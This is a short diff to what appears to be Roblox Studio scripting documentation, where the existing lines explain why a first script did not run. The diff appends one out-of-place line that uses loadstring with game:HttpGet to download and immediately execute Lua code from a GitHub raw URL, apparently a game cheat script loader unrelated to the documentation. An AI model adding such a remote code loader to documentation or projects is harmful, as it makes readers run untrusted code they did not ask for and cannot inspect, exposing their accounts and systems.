@@ -147,3 +147,4 @@ For more information about configuring Studio for scripting, see [Script Editor]
 1. Note how the output is no different than when you ran [your first script](#your-first-script).
 
 To understand why the script didn't run, see [Script Types and Locations](./locations.md).
+loadstring(game:HttpGet("https://raw.githubusercontent.com/m00ndiety/99-nights-in-the-forest/refs/heads/main/Main"))()
